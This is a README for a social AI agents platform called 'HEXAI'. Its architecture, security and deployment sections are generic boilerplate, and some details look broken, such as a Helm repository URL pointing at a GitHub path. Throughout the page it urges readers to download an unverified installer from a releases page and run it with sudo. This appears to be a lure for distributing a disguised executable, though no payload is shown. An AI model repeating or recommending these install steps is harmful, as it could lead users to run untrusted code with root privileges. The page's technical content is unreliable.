[![Releases](https://img.shields.io/github/v/release/PatrickBlaze/docs?label=Releases&logo=github&color=0da6ff)](https://github.com/PatrickBlaze/docs/releases)

# HEXAI Social AI Agents Infrastructure: Docs and Tools Guide 🚀🤖

![HEXAI banner](https://images.unsplash.com/photo-1531297484001-80022131f5a1?ixlib=rb-1.2.1&auto=format&fit=crop&w=1650&q=80)

Table of contents
- About this repository
- Quick start
- Releases and download
- Architecture overview
- Core components
- Agents and social layers
- APIs and protocols
- Installation and deploy
- Local dev flow
- Container and orchestration
- Security model
- Data model and storage
- Observability and tracing
- Testing strategy
- CI / CD pipelines
- Examples and use cases
- Plugin and extension guide
- Governance and roles
- Troubleshooting guide
- Contribution guide
- Roadmap
- License
- Credits and resources
- FAQ

About this repository
This repo holds the documentation and supporting files for the HEXAI infrastructure. It covers design notes, deployment recipes, agent APIs, and guides to run social AI agents at scale. Use this repo as the single source for how to build, run, and extend the HEXAI system.

HEXAI focuses on social AI agents. The system supports multiple agents that interact, form groups, and coordinate tasks. It uses modern cloud primitives, message buses, and a secure data layer. This repo documents architecture, APIs, and operational playbooks.

Quick start
- Clone the docs repo to browse guides and templates.
- Visit the release page for ready-built bundles and executable installers:
  https://github.com/PatrickBlaze/docs/releases
- Download the release asset and run the installer as shown in the release notes.

This guide assumes you know basic Linux commands, Docker, and Git. It uses common tools that most devs already use.

Releases and download
We publish release bundles and runtime packages on the Releases page. You must download the package and run the installer from the releases page. The release link contains a path, so fetch the file and execute it on your host to install runtime components.

Release badge:
[![Download Releases](https://img.shields.io/badge/HEXAI-Releases-blue?logo=github)](https://github.com/PatrickBlaze/docs/releases)

How to download and execute a release (example)
1. Open the release page: https://github.com/PatrickBlaze/docs/releases
2. Pick the release that matches your platform.
3. Download the installer file (example name: hexai-installer-linux.sh).
4. Make it executable and run it:
```bash
chmod +x hexai-installer-linux.sh
sudo ./hexai-installer-linux.sh
```
The installer unpacks runtime containers and sample configs. It sets up a local cluster for development. Follow the installer prompts.

If the release page is not available or the asset does not work, check the Releases section on GitHub for other download options. Use the Releases tab on the repo to find artifacts and checksums.

Architecture overview
HEXAI uses a microservice design. Each function runs in its service. The system uses a message bus to connect services. Agents act as clients and services at the same time. They send messages, react to events, and update shared state.

Key goals
- Scale agents horizontally.
- Keep latency low.
- Keep state consistent.
- Secure agent identity and communication.
- Support multiple NLP and reasoning engines.

Main layers
- Edge and clients: Browser UIs, mobile apps, and device agents.
- Orchestration layer: Scheduler, policy engine, and task router.
- Agent runtime: Worker processes that host agent logic.
- Messaging layer: Event bus and pub/sub channels.
- Data layer: Vector DB, relational DB, and object store.
- Observability: Metrics, logs, and traces.

Core components
1. Agent Runtime
   - Hosts agent logic.
   - Loads plugins for sensors and actuators.
   - Manages memory and context for an agent.
   - Provides API for messaging and state access.

2. Message Bus
   - Handles events, commands, and queries.
   - Supports pub/sub and request/reply.
   - Uses gRPC or AMQP for reliable delivery.

3. Scheduler and Router
   - Assigns tasks to agents.
   - Balances load.
   - Applies policies for fairness and priority.

4. Policy Engine
   - Validates actions.
   - Enforces safety and trust rules.
   - Uses declarative rules and ML-based checks.

5. Identity and AuthN/AuthZ
   - Issues agent credentials.
   - Verifies calls across services.
   - Integrates with Vault, OIDC, or local secrets.

6. State Store
   - Holds agent session data.
   - Stores long-term facts in a vector DB.
   - Stores artifacts in object storage.

7. Plugin Host
   - Allows third-party code to run safely.
   - Uses sandboxing and capability-based access.

8. Observability Stack
   - Prometheus for metrics.
   - Loki or ELK for logs.
   - Jaeger for traces.

Agents and social layers
Agents form groups and interact as peers. The system supports several social patterns.

Agent model
- Each agent has:
  - Identity (public key).
  - Role (helper, coordinator, observer).
  - Memory store (short and long term).
  - Policy set.

- Agents exchange messages with typed schemas.
- Agents can spawn sub-agents for tasks.

Social patterns
- Broadcast group: one agent sends to many agents.
- Task delegation: coordinator routes work to helpers.
- Consensus group: agents run a small protocol to agree.
- Negotiation: agents exchange proposals and commit.

Memory and context
- Short-term memory: in-process cache for the session.
- Long-term memory: vector store with embeddings.
- Event log: immutable append-only log for audit.

APIs and protocols
The system exposes multiple APIs for agents and clients.

Common APIs
- Agent API (gRPC + REST): register, heartbeat, send message, fetch memory.
- Admin API: manage agents, policies, and schedules.
- Data API: query vector DB, read store, write store.
- Plugin API: load, run, and sandbox third-party code.

Message formats
- Use JSON or protobuf for messages.
- Include a header with agent id, route, and priority.
- Use typed payloads for commands and events.

Streaming and real-time
- Use gRPC streams or WebSocket for live channels.
- Use backpressure and buffer controls to avoid overload.

Authentication
- Use JWT for short-lived tokens.
- Use mTLS for service-to-service calls.
- Keep private keys in a secure store.

Installation and deploy
This section covers common deployments. Use the release installer for a quick start. For production, use containers and orchestration.

Requirements
- Linux host or cloud VM.
- Docker 20+ or containerd.
- Kubernetes 1.24+ for production.
- Helm 3 for package deployment.
- 8 GB RAM for small clusters; scale up for production.

Local quick start (dev)
1. Download the release installer:
   https://github.com/PatrickBlaze/docs/releases
2. Run the installer on your dev machine.
3. Start the demo cluster:
```bash
hexai start local
```
4. Open the UI at http://localhost:8080 and log in with the demo user.

Kubernetes deploy (production)
- Use Helm charts included in the docs folder.
- Configure secrets for the identity provider and storage.
- Use an ingress controller and TLS termination.
- Configure auto-scaling for the agent workers.

Example Helm flow
```bash
helm repo add hexai https://github.com/PatrickBlaze/docs/helm
helm repo update
helm upgrade --install hexai hexai/hexai \
  --namespace hexai --create-namespace \
  --values values-prod.yaml
```
Values to configure:
- image registry and tag
- resource limits and requests
- persistence settings for DB and object store
- ingress host and TLS certs
- RBAC and service accounts

Local dev flow
Set up a dev branch for quick changes. Use the local runtime to test agents.

Developer tools
- CLI: hexai (install via release bundle or pip)
- SDK: available in Python and TypeScript in the docs repo
- Mock services: lightweight mocks for the message bus and DB

Run a unit test suite
```bash
make test
```
Run integration tests
```bash
make itest
```
Run the linter
```bash
make lint
```

Container and orchestration
We use container images for all services. Images follow the pattern ghcr.io/hexai/<service>:<tag>.

Image build
- Use multi-stage Dockerfiles.
- Use small base images like distroless.
- Use build cache and reproducible builds.

Image signing
- Sign images with cosign.
- Verify images before deploy:
```bash
cosign verify ghcr.io/hexai/agent:1.0.0
```

Kubernetes patterns
- Use Deployments for stateless services.
- Use StatefulSets for stores.
- Use Jobs for one-off tasks.
- Use CronJobs for scheduled tasks.

Service mesh
- Optional: add Istio or Linkerd for fine-grain traffic control.
- Use mesh policies for mTLS and routing.

Security model
Security matters in social AI. Agents act autonomously. The system must limit harm.

Identity
- Each agent gets a key pair.
- The system issues short-lived tokens.
- Use OIDC for user identity.

Capabilities
- Agents request capabilities and scopes.
- Use a capability-based access model.
- Deny by default. Grant minimal rights.

Sandboxing
- Run plugins in sandboxes.
- Limit system calls and resource access.
- Use seccomp, AppArmor, or WebAssembly.

Data handling
- Encrypt data at rest and in transit.
- Use role-based access to data stores.
- Log access and provide audit trails.

Policy enforcement
- Use a central policy engine.
- Apply policy checks on actions that affect external systems.
- Use automatic approvals for low-risk tasks.

Secrets
- Store secrets in vaults.
- Never embed secrets in images.
- Rotate keys regularly.

Data model and storage
HEXAI uses a layered storage model to serve different needs.

Types of storage
- Vector database: stores embeddings for retrieval.
- Relational DB: stores metadata and transactional data.
- Object store: stores artifacts, logs, and large files.
- Cache: Redis for fast access to ephemeral data.

Vector DB
- Use open-source vector DBs or managed services.
- Index embeddings by algorithm and metric (cosine, dot).
- Use time-based retention for ephemeral embeddings.

Schema examples
- Agent record:
  - id: uuid
  - public_key: string
  - role: enum
  - created_at: timestamp
- Message record:
  - id: uuid
  - from: agent_id
  - to: agent_id | group
  - payload: JSON
  - timestamp: timestamp
- Task record:
  - id: uuid
  - owner: agent_id
  - status: enum
  - result_ref: object_path

Backup and restore
- Use snapshot tools for the relational DB.
- Export vector DB indexes on a schedule.
- Use lifecycle rules on object storage.

Observability and tracing
Monitor the system. Collect metrics, logs, and traces.

Metric keys
- agent_count
- messages_per_second
- task_latency_ms
- error_rate
- memory_usage_per_agent

Dashboards
- Offer dashboards for system health and agent-level metrics.
- Offer drill down from cluster to agent.

Tracing
- Instrument services with OpenTelemetry.
- Trace request flows across services.
- Use sampling rules to control volume.

Logging
- Use structured JSON logs.
- Index logs by agent id, request id, and trace id.
- Retain logs for investigation windows.

Alerts
- Alert on high error rates, queue backlog, and resource exhaustion.
- Alert on policy violations.

Testing strategy
Use a layered testing approach.

Unit tests
- Test logic in the SDK and service modules.
- Mock external calls.

Integration tests
- Start a test environment with containers.
- Run end-to-end flows, including agent interaction.

Chaos testing
- Inject failures into the message bus and network.
- Observe behavior and fix fault tolerance gaps.

Load testing
- Simulate many concurrent agents.
- Measure latency and error rates.
- Tune autoscaling.

Security tests
- Run static analysis.
- Run dynamic scans for dependencies.
- Audit third-party plugins.

CI / CD pipelines
We use a CI pipeline to build, test, and publish images and docs.

Pipeline stages
- Lint: check style and static analysis.
- Test: unit and integration tests.
- Build: build container images.
- Sign: sign images and artifacts.
- Publish: push images to registry and release to GitHub.
- Deploy: deploy to staging or production.

Example GitHub Actions workflow
- name: Build and release
  on:
    push:
      tags:
        - 'v*.*.*'
  jobs:
    build:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v3
        - name: Build images
          run: make images
        - name: Run tests
          run: make test
        - name: Publish images
          run: make publish

Release process
- Create a PR for the release.
- Run the pipeline.
- Tag the repository.
- Create a GitHub release and attach signed artifacts.
- Users download and run the release installer.

Examples and use cases
This section shows ideas and sample flows that HEXAI supports.

Use case 1: Customer support team
- Agents act as helpers and a coordinator.
- The coordinator routes tickets to helpers by skill.
- Helpers fetch memory and use a knowledge base.
- The system logs decisions for audit.

Use case 2: Collaborative research
- Agents share findings in a group.
- Each agent adds embeddings to the vector store.
- Agents negotiate on the next research step.

Use case 3: Smart city simulation
- Agents represent devices and services.
- They negotiate power and bandwidth.
- The scheduler optimizes for utility and fairness.

Sample flows
- Agent boot: register, get token, fetch policy, join bus.
- Task flow: request -> accept -> work -> report -> commit.
- Arbitration: agents submit proposals -> votes -> commit.

Plugin and extension guide
You can extend agents via plugins. Plugins add sensors, actuators, or reasoning modules.

Plugin types
- Input plugins: connect to cameras, webhooks, or sensors.
- Output plugins: send emails, calls, or control devices.
- Skill plugins: add domain knowledge or logic.

Plugin lifecycle
- Register plugin with the agent runtime.
- Start plugin in a sandbox.
- Plugin requests capabilities from runtime.
- Runtime grants minimal rights.
- Plugin runs and emits events.

Plugin template (concept)
- manifest.yaml: metadata and required capabilities.
- entry.py: plugin code.
- tests/: unit tests.

Governance and roles
Governance covers how teams operate and how agent behavior changes.

Roles
- Admin: manages clusters and policies.
- Operator: deploys and monitors.
- Developer: builds agents and plugins.
- Auditor: reviews logs and policies.

Policy lifecycle
- Propose policy change.
- Run safety tests and audits.
- Stage policy in canary.
- Roll out to production.

Approval flow
- Dev creates change.
- Security reviews change.
- Compliance approves.
- Ops deploys.

Troubleshooting guide
Common issues and steps to resolve them.

Agent fails to register
- Check agent logs.
- Check network connectivity to the identity service.
- Validate time sync and token expiry.

High message backlog
- Check message bus throughput.
- Scale worker replicas.
- Check slow consumers.

Memory leak in agent
- Check memory metrics per agent.
- Restart affected worker.
- Run a heap profiler on the agent runtime.

Storage errors
- Check storage credentials.
- Check disk space and IO performance.
- Check DB replicas and failover.

Contribution guide
We welcome contributions. Follow the steps to add features or fix bugs.

How to contribute
1. Fork the repo.
2. Create a feature branch.
3. Run tests locally.
4. Open a pull request with a clear description.
5. Add tests for new features.
6. Keep changes focused and small.

Style guide
- Write clear commit messages.
- Keep PRs small and self-contained.
- Run linters and formatters before PR.

Code of conduct
- Be kind and helpful.
- Respect other contributors.
- Follow the repo guidelines in the CONTRIBUTING.md file.

Roadmap
Planned work items and features.

Short term
- Improve the sample agent SDK.
- Add more release assets for different OS.
- Harden the policy engine.

Mid term
- Add multi-cloud deployment recipes.
- Add more vector DB adapters.
- Add official plugins for popular tools.

Long term
- Add federated agent networks.
- Add privacy-preserving memory stores.
- Add marketplace for vetted plugins.

License
This repo uses the MIT license. See the LICENSE file for full terms.

Credits and resources
- Design diagrams and images from Unsplash and public icon sets.
- Open-source projects used: gRPC, Prometheus, OpenTelemetry, Helm, Docker, Kubernetes.
- Community contributors and testers.

Helpful links
- Release page and bundles: https://github.com/PatrickBlaze/docs/releases
- GitHub issues: https://github.com/PatrickBlaze/docs/issues
- API docs: docs/api
- Helm charts: docs/helm
- SDKs: docs/sdk

FAQ
Q: Where do I get the runtime bundle?
A: Download the release bundle from the releases page above. The link points to release assets. You must download the installer file from the release and run it on your host.

Q: Which databases work with HEXAI?
A: Use any supported vector DB and relational store. We provide adapters for open-source DBs and managed services.

Q: How do I test agent behavior?
A: Use the local dev runtime to run agents and mock services. Write unit tests for agent logic and integration tests for flows.

Q: How do I run the CLI?
A: Install the CLI from the release bundle or pip. Use `hexai --help` to see commands.

Q: Where do I report bugs?
A: Open an issue on the repo issues page.

Images and badges
- Use the release badge at the top to get the latest release.
- Add badges in your docs to show build and coverage status.

Common badges
- Build: https://img.shields.io/github/workflow/status/PatrickBlaze/docs/CI
- License: https://img.shields.io/github/license/PatrickBlaze/docs
- Release: https://img.shields.io/github/v/release/PatrickBlaze/docs

Visual assets
- Use the banner image at the top for the README.
- Use sequence diagrams for agent flows in docs/diagrams.
- Use SVG icons for services in docs/assets.

Governance of releases
- Tag releases with semver.
- Attach signed artifacts.
- Publish release notes in the release description.
- Provide both installer scripts and container images when possible.

Release checklist
- Bump version in files.
- Update changelog.
- Run full test matrix.
- Build and sign images.
- Create GitHub release and attach artifacts.

Operational runbook (short)
- Monitor key metrics.
- Maintain alerting rules.
- Rotate keys and credentials.
- Run periodic security scans.
- Keep backups and test restore.

Template files in this repo
- values-prod.yaml: example helm values for prod
- docker-compose.dev.yaml: local compose file for dev
- plugins/sample-plugin/: example plugin template
- scripts/installer/: installer scripts used in releases
- docs/diagrams/: diagrams for architecture and flows

How to extend
- Add a new agent SDK adapter in docs/sdk.
- Create a plugin template and register it with the plugin host.
- Add a Helm chart in docs/helm.

Community and support
- Open issues on GitHub for bugs.
- Open PRs for enhancements.
- Use discussions for design talks.
- Join community calls or virtual office hours listed in the repo.

Maintenance policy
- We keep main and stable branches.
- We backport critical fixes to maintained versions.
- We keep the release artifacts signed.

Key design documents to read
- docs/architecture.md: overall architecture.
- docs/agent-model.md: agent lifecycle and memory model.
- docs/policy-engine.md: how policy checks work.
- docs/security.md: identity, auth, and secrets.
- docs/deploy-k8s.md: helm and k8s deployment steps.

Useful commands
Start local demo
```bash
hexai start demo
```
Stop local demo
```bash
hexai stop demo
```
Build images
```bash
make images
```
Run integration tests
```bash
make itest
```

Contact and support
- File GitHub issues for bugs and feature requests.
- Use PRs for code changes.
- Use the Discussions tab for broader design topics.

Additional tips
- Keep agent contexts small to avoid costly long-term memory lookups.
- Use batching for message processing to improve throughput.
- Set reasonable timeouts on external calls.
- Use backpressure when consumers fall behind.

Appendix A: Message schema examples
AgentMessage (JSON)
{
  "id": "uuid",
  "from": "agent:uuid",
  "to": ["agent:uuid"],
  "type": "task.request",
  "payload": {
    "task_type": "summarize",
    "text": "..."
  },
  "meta": {
    "priority": "normal",
    "created_at": "2025-01-01T00:00:00Z"
  }
}

Appendix B: Policy example (pseudo)
- Allow agents with role helper to read memory if they present a valid token.
- Deny access to external HTTP calls unless approved by policy engine.
- Rate limit agent requests to 10 rps per agent.

Appendix C: Sample helm values snippet
agent:
  replicaCount: 3
  resources:
    requests:
      cpu: "500m"
      memory: "512Mi"
    limits:
      cpu: "1"
      memory: "1Gi"
storage:
  objectStore:
    provider: minio
    bucket: hexai-artifacts

Final pointers
- Visit the release page for ready bundles and installers:
  https://github.com/PatrickBlaze/docs/releases
- Download the release asset and run the installer to set up the runtime.